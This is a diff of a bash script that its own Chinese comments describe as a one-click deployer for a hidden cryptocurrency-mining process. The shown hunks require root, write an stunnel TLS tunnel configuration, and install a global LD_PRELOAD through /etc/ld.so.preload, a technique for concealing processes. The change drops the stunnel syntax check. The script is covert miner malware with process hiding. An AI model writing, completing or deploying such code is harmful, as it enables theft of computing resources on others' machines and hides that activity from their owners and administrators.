@@ -1,8 +1,7 @@
 #!/bin/bash
 
-# 隐藏挖矿进程的一键部署脚本（加密配置文件，限制线程和 CPU 使用率）
+# 隐藏挖矿进程的一键部署脚本（跳过 stunnel 语法检查，直接启动验证）
 
-# 检查是否以 root 权限运行
 if [ "$(id -u)" != "0" ]; then
     echo "此脚本需要 root 权限运行" 1>&2
     exit 1
@@ -164,10 +163,8 @@ curve = secp384r1
 EOF
 chmod 600 "$stunnel_conf"
 
-# 验证 stunnel 配置文件
-echo "验证 stunnel 配置文件..."
-[ ! -f "$stunnel_conf" ] && { echo "错误：stunnel 配置文件 $stunnel_conf 不存在" 1>&2; exit 1; }
-stunnel4 -verify=4 "$stunnel_conf" || { echo "错误：stunnel 配置文件无效，请检查语法或权限" 1>&2; exit 1; }
+# 跳过 stunnel 语法检查，直接依赖服务启动验证
+echo "创建 stunnel 配置文件完成，将在服务启动时验证..."
 
 # 设置全局 LD_PRELOAD
 [ -f "$ld_preload" ] && cp "$ld_preload" /etc/ld.so.preload.bak
